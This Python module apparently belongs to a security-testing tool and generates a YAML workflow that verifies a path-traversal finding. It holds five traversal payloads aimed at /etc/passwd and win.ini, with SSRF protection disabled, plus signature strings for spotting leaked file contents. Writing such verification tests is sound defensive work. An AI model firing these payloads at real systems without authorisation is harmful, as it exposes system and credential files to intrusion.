"""Path-traversal test blueprint — generates flyto-core YAML.

Requests classic `../` and encoded variants against a file-serving endpoint.
If the server echoes `root:x:0:0` or `[extensions]` (win.ini), it is
exploitable.
"""
from __future__ import annotations

import yaml

from ..schema import SecurityFinding


_TRAVERSAL_SIGNATURES = [
    "root:x:0:0",        # /etc/passwd
    "daemon:x:",
    "[extensions]",      # win.ini
    "[fonts]",
    "127.0.0.1",         # /etc/hosts
    "localhost",
]


def generate(finding: SecurityFinding, target_url: str, auth_token: str | None) -> str:
    method = (finding.http_method or "GET").upper()
    param = finding.param_name or "file"
    path = finding.endpoint_path or "/download"
    base = f"{target_url}{path}"

    payloads = [
        ("basic_unix", "../../../../etc/passwd"),
        ("encoded_unix", "..%2F..%2F..%2F..%2Fetc%2Fpasswd"),
        ("double_encoded", "%252F..%252F..%252F..%252Fetc%252Fpasswd"),
        ("basic_win", "..\\..\\..\\..\\windows\\win.ini"),
        ("null_byte", "../../../../etc/passwd%00.jpg"),
    ]

    probe_requests = [_req(method, base, param, "normal.txt", auth_token)]
    for _label, p in payloads:
        probe_requests.append(_req(method, base, param, p, auth_token))

    workflow = {
        "id": f"verify_path_traversal_{param}",
        "name": f"Path Traversal Verify: {param} at {path}",
        "version": "1.0.0",
        "description": f"Auto-generated verification for path traversal at {finding.source_file}:{finding.source_line}",
        "timeout": 180,
        "steps": [
            {"id": "start", "module": "flow.start", "label": "Start", "params": {}, "orderIndex": 0},
            {
                "id": "path_probes",
                "module": "http.batch",
                "label": "Path Traversal Probes",
                "params": {
                    "description": "Baseline + 5 traversal payloads (unix, encoded, double-encoded, windows, null-byte)",
                    "requests": probe_requests,
                    "timeout": 15,
                    "ssrf_protection": False,
                    "detect_patterns": _TRAVERSAL_SIGNATURES,
                },
                "orderIndex": 1,
            },
            {
                "id": "assert_traversal",
                "module": "test.assert_contains",
                "label": "Assert Traversal Exploitable",
                "params": {
                    "source": "${path_probes.items}",
                    "patterns": _TRAVERSAL_SIGNATURES,
                    "match_mode": "any",
                    "on_match": "exploitable",
                    "on_no_match": "sanitized",
                },
                "orderIndex": 2,
            },
            {
                "id": "report",
                "module": "output.display",
                "label": "Report",
                "params": {
                    "format": "json",
                    "data": {
                        "result": "${assert_traversal.data}",
                        "finding_source": f"{finding.source_file}:{finding.source_line}",
                        "finding_sink": f"{finding.sink_file}:{finding.sink_line}",
                    },
                },
                "orderIndex": 3,
            },
        ],
        "edges": [
            {"source": "start", "target": "path_probes"},
            {"source": "path_probes", "target": "assert_traversal"},
            {"source": "assert_traversal", "target": "report"},
        ],
    }
    return yaml.dump(workflow, default_flow_style=False, allow_unicode=True, sort_keys=False)


def _req(method, base, param, value, auth_token):
    headers: dict[str, str] = {}
    if auth_token:
        headers["Authorization"] = f"Bearer {auth_token}"
    if method == "GET":
        sep = "&" if "?" in base else "?"
        req: dict = {"method": "GET", "url": f"{base}{sep}{param}={value}"}
    else:
        headers["Content-Type"] = "application/json"
        req = {"method": method, "url": base, "body": {param: value}}
    if headers:
        req["headers"] = headers
    return req
